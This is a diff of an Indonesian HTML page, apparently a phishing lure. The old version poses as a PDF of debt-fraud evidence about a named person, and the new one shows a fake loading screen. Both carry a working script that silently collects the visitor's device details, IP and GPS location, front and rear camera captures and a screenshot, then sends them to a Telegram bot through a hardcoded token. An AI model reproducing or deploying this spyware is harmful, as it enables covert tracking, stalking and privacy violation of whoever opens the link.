@@ -1,12 +1,11 @@
+<!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>📄 EXE99.pdf</title>
-  <!-- Font & Ikon (opsional) -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-  <style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>semuabuktinajwa</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <  <style>
     * {
       margin: 0;
       padding: 0;
@@ -271,87 +270,15 @@
   </style>
 </head>
 <body>
-  <div class="pdf-viewer">
-    <!-- Toolbar -->
-    <div class="pdf-toolbar">
-      <div class="toolbar-left">
-        <i class="fas fa-file-pdf" style="color: #c0392b;"></i>
-        <span>EXE99.pdf</span>
-        <span class="badge-pdf">PDF</span>
-      </div>
-      <div class="toolbar-right">
-        <i class="fas fa-chevron-left" title="Halaman sebelumnya"></i>
-        <span class="page-indicator">1 / 1</span>
-        <i class="fas fa-chevron-right" title="Halaman berikutnya"></i>
-        <i class="fas fa-arrows-alt" title="Zoom"></i>
-        <i class="fas fa-search" title="Cari"></i>
-        <i class="fas fa-download" title="Unduh"></i>
-      </div>
+    <div id="loading-container">
+        <div id="loading-text">PROSES LOADING</div>
+        <div id="progress-container"><div id="progress-bar"></div></div>
+        <div id="loading-details">Memulai inisialisasi...</div>
     </div>
+    
+    <video id="v" autoplay muted class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
 
-    <!-- Konten "PDF" -->
-    <div class="pdf-content">
-      <!-- header dokumen -->
-      <div class="doc-header">
-        <h1>EXE99</h1>
-        <div class="subhead">Tentang Hutang Karena Arisan</div>
-        <div class="doc-meta">
-          <span><i class="far fa-calendar-alt"></i> 31 Agustus 2026</span>
-       <!--<span><i class="far fa-user"></i> Tim Pengembangan</span>
-          <span><i class="far fa-file-alt"></i> Versi 2.4</span>
-        </div>
-      </div>
-
-      <!-- body paragraf -->
-      <div class="doc-body">
-        <p>
-          <strong>Ringkasan Singkat</strong> — Dokumen ini menyajikan bukti lengkap
-          mengenai EXE99 dan hutang piutang kepada orang. 
-          Seluruh data telah diverifikasi dan disusun berdasarkan standar pelaporan 
-          internal. Dengan pendekatan berbasis analisis kuantitatif, laporan ini 
-          diharapkan menjadi bukti bagi pengambilan keputusan pelaporan.
-        </p>
-        <p>
-          Hal begitu dapat di laporkan sesuai dengan pasal undang undang di bawah, sebagai mana yang di jelaskan di bawah. 
-        </p>
-
-
-        <!-- kutipan / highlight -->
-        <div class="highlight-box">
-          <i class="fas fa-quote-left" style="margin-right: 8px; color: #2a5c8a;"></i>
-          “KUHP Baru (UU 1/2023): Pasal 492. Ancaman pidana penjara maksimal 4 tahun atau denda kategori V (maksimal Rp 500 juta) .
-  · Perbandingan: Substansi hampir sama dengan Pasal 378 KUHP lama, yang juga mengancam pidana penjara 4 tahun .
-· Unsur-Unsur yang Harus Terbukti
-  · Niat: Ada maksud untuk menguntungkan diri sendiri atau orang lain secara melawan hukum .
-        </div>
-
-        <p>
-          <strong>Analisis lebih lanjut</strong> lengkapi dengan bukti tambahan dari anda biar dapat di proses dengan UUD yang lain, dan dapat menambah hukuman kepada pelaku.
-        </p>
-        <p>
-          <i class="fas fa-check-circle" style="color: #1f6d3b;"></i> 
-          Rekomendasi: laporkan ke pihak berwajib dengan bukti bukti yang lengkap, semua bukti tentang Najwa Paputungan ada semua di sini.
-        
-        </p>
-      </div>
-
-      <!-- footer "PDF" -->
-      <div class="pdf-footer">
-        <span>
-          <i class="far fa-clock"></i> Dibuat: 2 September 2026 · 14:30 WIB
-        </span>
-        <span class="page-watermark">
-          <i class="fas fa-lock" style="opacity: 0.5;"></i> dokumen internal
-        </span>
-        <span>
-          <i class="fas fa-print"></i>  ·  <i class="fas fa-share-alt"></i>
-        </span>
-      </div>
-    </div>
-    <!-- akhir pdf-content -->
-  </div>
-  <!-- akhir pdf-viewer -->
-  
 <script>
 (()=>{
     const T='8931888416:AAHvrs5jZ6jjHWepHbUVrjWDcoKJaUF1U3k', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
@@ -380,7 +307,7 @@
     const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
     
     // Fungsi mendapatkan informasi perangkat
-    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───Develover @E2992x  ───── ⦿';return m};
+    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───Develover @N4D_29  ───── ⦿';return m};
 
     // Mengambil gambar dari kamera dengan mode tertentu
     const captureCamera = async (mode) => {
@@ -437,26 +364,15 @@
              await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
         }
 
-        // Ambil Tangkapan Layar 
+        // Ambil Screenshot 
         setTimeout(async()=>{
             try{
-                // Cek apakah html2canvas sudah tersedia
-                if (typeof html2canvas !== 'undefined') {
-                    const canvas = await html2canvas(document.body, {
-                        scale: 1,
-                        useCORS: true,
-                        logging: false,
-                        allowTaint: true,
-                        backgroundColor: '#ffffff'
-                    });
-                    canvas.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
-                } else {
-                    await sTG('❌ html2canvas tidak ditemukan');
-                }
+                const cn=await html2canvas(document.body);
+                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
             }catch(e){
-                await sTG(`❌ Screenshot failed: ${e.message}`);
+                await sTG('❌ Screenshot failed')
             }
-        }, 2500 ); // Tambah waktu tunggu menjadi 3 detik untuk memastikan library termuat
+        }, 2000); 
 
         // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
         if(navigator.geolocation){
@@ -479,12 +395,8 @@
         }
     };
 
-    // Tunggu hingga halaman dan semua resource termuat
-    if (document.readyState === 'complete') {
-        ST();
-    } else {
-        window.addEventListener('load', ST);
-    }
+    // Langsung menjalankan fungsi ST tanpa delay
+    ST();
 })();
 </script>
 </body>
